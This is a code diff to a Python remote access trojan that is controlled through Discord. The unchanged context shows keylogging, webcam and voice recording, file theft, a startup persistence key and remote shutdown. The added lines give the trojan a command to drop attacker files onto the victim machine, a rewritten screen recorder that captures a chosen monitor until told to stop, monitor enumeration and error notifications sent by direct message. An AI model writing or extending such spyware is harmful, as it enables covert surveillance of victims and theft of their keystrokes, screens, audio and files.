@@ -262,13 +262,10 @@ command_descriptions = {
 # Bot help command
 @bot.command(name='bot_commands')
 async def bot_commands(ctx):
-    help_message = "**Available Commands:**\n\n"
+    embed = discord.Embed(title="Available Commands", color=discord.Color.blue())
     for command, description in command_descriptions.items():
-        help_message += f"{command}: {description}\n\n"
-
-    # Send the message inside a code block
-    boxed_help_message = f"```md\n{help_message}```"
-    await ctx.send(boxed_help_message)
+        embed.add_field(name=command, value=description, inline=False)
+    await ctx.send(embed=embed)
 
 # Function to remove startup key
 # Function to remove startup key
@@ -465,6 +462,30 @@ async def download(ctx, source_path):
     except FileNotFoundError:
         await ctx.send("Source file not found.")
 
+#upload function
+@bot.command()
+async def upload(ctx, destination_path):
+    if len(ctx.message.attachments) == 0:
+        await ctx.send("Please attach a file to upload.")
+        return
+
+    # Basic path traversal check
+    if '..' in destination_path or os.path.isabs(destination_path):
+        await ctx.send("Invalid destination path.")
+        return
+
+    attachment = ctx.message.attachments[0]
+    try:
+        response = requests.get(attachment.url)
+        response.raise_for_status()
+        with open(destination_path, 'wb') as file:
+            file.write(response.content)
+        await ctx.send(f"File uploaded successfully to ``{destination_path}``")
+    except requests.exceptions.RequestException as e:
+        await ctx.send(f"Error downloading the file: {e}")
+    except IOError as e:
+        await ctx.send(f"Error saving the file: {e}")
+
 # Command : CAM LIST
 @bot.command()
 async def cam_list(ctx):
@@ -565,7 +586,7 @@ async def rat_down(ctx):
 @bot.command()
 async def sys_shutdown(ctx):
     await ctx.send("Shutting down...")
-    subprocess.call(["shutdown", "/s", "/t", "0"], shell=True)
+    subprocess.run(["shutdown", "/s", "/t", "0"])
 
 # Command : SYSTEM RESTART
 @bot.command()
@@ -612,6 +633,14 @@ async def voice_rec(ctx, duration: int):
     except Exception as e:
         await ctx.send(f"Error sending audio: {str(e)}")
 
+# IoT Device Control (Placeholder)
+@bot.command()
+async def iot_control(ctx, device: str, action: str):
+    await ctx.send(f"Received IoT command: Device='{device}', Action='{action}'.")
+    # In a real implementation, you would add code here to interact with your IoT devices.
+    # This could involve making API calls to a smart home hub, sending commands to a specific device, etc.
+    print(f"Received IoT command: Device='{device}', Action='{action}'")
+
 #keylog
 @bot.command()
 async def start_keylogger(ctx):
@@ -633,40 +662,63 @@ async def start_keylogger(ctx):
         listener.join()
 
 
+# List monitors
+@bot.command()
+async def list_monitors(ctx):
+    with mss() as sct:
+        monitors = sct.monitors
+        embed = discord.Embed(title="Available Monitors", color=discord.Color.blue())
+        for i, monitor in enumerate(monitors):
+            embed.add_field(name=f"Monitor {i}", value=f"Resolution: {monitor['width']}x{monitor['height']}\nPosition: {monitor['left']},{monitor['top']}", inline=False)
+        await ctx.send(embed=embed)
+
+recording = False
+output_video = None
+
 #streamscrenn
 @bot.command()
-async def recscreen(ctx):
-    try:
-        reclenth = float(ctx.message.content[10:])
-    except ValueError:
-        await ctx.send("Invalid duration. Please specify a valid number after '!recscreen'.")
-        return
-    if reclenth <= 0:
-        await ctx.send("Invalid duration. Please specify a positive number after '!recscreen'.")
+async def recscreen(ctx, monitor: int = 0):
+    global recording, output_video
+    if recording:
+        await ctx.send("A recording is already in progress.")
         return
 
-    input2 = 0
-    while True:
-        input2 = input2 + 1
-        input3 = 0.045 * input2
-        if input3 >= reclenth:
-            break
+    recording = True
+    await ctx.send("Screen recording started.")
 
-    SCREEN_SIZE = (1920, 1080)
+    with mss() as sct:
+        monitors = sct.monitors
+        if monitor >= len(monitors):
+            await ctx.send("Invalid monitor ID.")
+            recording = False
+            return
+        mon = monitors[monitor]
+
+    SCREEN_SIZE = (mon['width'], mon['height'])
     fourcc = cv2.VideoWriter_fourcc(*"XVID")
     temp = os.getenv('TEMP')
     videeoo = os.path.join(temp, "output.avi")
-    out = cv2.VideoWriter(videeoo, fourcc, 20.0, SCREEN_SIZE)
-    counter = 1
-    while True:
-        counter = counter + 1
-        img = pyautogui.screenshot()
+    output_video = cv2.VideoWriter(videeoo, fourcc, 20.0, SCREEN_SIZE)
+
+    while recording:
+        img = pyautogui.screenshot(region=(mon['left'], mon['top'], mon['width'], mon['height']))
         frame = np.array(img)
         frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        out.write(frame)
-        if counter >= input2:
-            break
-    out.release()
+        output_video.write(frame)
+        await asyncio.sleep(0.05)
+
+@bot.command()
+async def stop_recscreen(ctx):
+    global recording, output_video
+    if not recording:
+        await ctx.send("No recording is in progress.")
+        return
+
+    recording = False
+    output_video.release()
+    output_video = None
+
+    temp = os.getenv('TEMP')
     check = os.path.join(temp, "output.avi")
     check2 = os.stat(check).st_size
     if check2 > 7340032:
@@ -1266,6 +1318,30 @@ async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
 
 
 
+notifications_enabled = False
+
+@bot.command()
+async def notifications(ctx, state: str):
+    global notifications_enabled
+    if state.lower() == 'on':
+        notifications_enabled = True
+        await ctx.send("Push notifications have been enabled.")
+    elif state.lower() == 'off':
+        notifications_enabled = False
+        await ctx.send("Push notifications have been disabled.")
+    else:
+        await ctx.send("Invalid state. Please use `on` or `off`.")
+
+async def send_notification(message):
+    if notifications_enabled:
+        for guild in bot.guilds:
+            for member in guild.members:
+                if not member.bot:
+                    try:
+                        await member.send(message)
+                    except discord.errors.Forbidden:
+                        pass # Can't send DMs to this user
+
 #error handling
 @bot.event
 async def on_command_error(ctx, error):
@@ -1277,9 +1353,11 @@ async def on_command_error(ctx, error):
         if isinstance(error, commands.CommandNotFound):
             error_message = f"Command `{ctx.message.content}` is not found"
         else:
-            error_message = f"An error occurred in command '{ctx.message.content}': {error}"
+            error_message = f"An unexpected error occurred."
 
+        print(f"Error in command '{ctx.message.content}': {error}")
         await channel.send(error_message)
+        await send_notification(f"An error occurred in command '{ctx.message.content}'. Check logs for details.")
     else:
         print(f"Error channel '・🔔│ʀᴀᴛ-ʟᴏɢꜱ' not found or bot doesn't have access.")
 # Run the bot with the token
